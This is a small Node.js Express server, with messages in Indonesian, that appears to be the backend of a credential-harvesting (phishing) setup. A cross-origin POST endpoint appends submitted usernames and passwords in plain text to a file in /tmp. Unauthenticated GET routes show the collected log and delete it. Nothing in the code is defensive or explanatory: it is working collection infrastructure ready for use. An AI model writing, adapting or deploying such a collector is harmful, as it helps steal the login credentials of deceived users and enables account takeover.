const express = require('express');
const fs = require('fs');
const path = require('path');
const bodyParser = require('body-parser');
const cors = require('cors');

const app = express();
const PORT = process.env.PORT || 10000;

app.use(cors());
app.use(bodyParser.json());

app.post('/simpan', (req, res) => {
  const { username, password } = req.body;
  const logData = `Username: ${username}, Password: ${password}\n`;
  const logPath = path.join('/tmp', 'logins.txt');

  fs.appendFile(logPath, logData, (err) => {
    if (err) {
      console.error('Gagal simpan:', err);
      return res.status(500).send('Gagal simpan data');
    }
    res.send('Berhasil disimpan ke server!');
  });
});

app.get('/', (req, res) => res.send("API aktif bro!"));

// ✅ Route lihat isi log
app.get('/lihat-log', (req, res) => {
  const logPath = path.join('/tmp', 'logins.txt');
  fs.readFile(logPath, 'utf8', (err, data) => {
    if (err) {
      console.error('Gagal baca log:', err);
      return res.status(500).send('Gagal baca log');
    }
    res.setHeader('Content-Type', 'text/plain');
    res.send(data);
  });
});

// ✅ Route hapus log
app.get('/hapus-log', (req, res) => {
  const logPath = path.join('/tmp', 'logins.txt');
  fs.unlink(logPath, (err) => {
    if (err) {
      console.error('Gagal hapus log:', err);
      return res.status(500).send('Gagal hapus log atau file tidak ditemukan');
    }
    res.send('Log berhasil dihapus!');
  });
});

// ⬇️ Harus paling bawah
app.listen(PORT, () => {
  console.log(`Server aktif di port ${PORT}`);
});
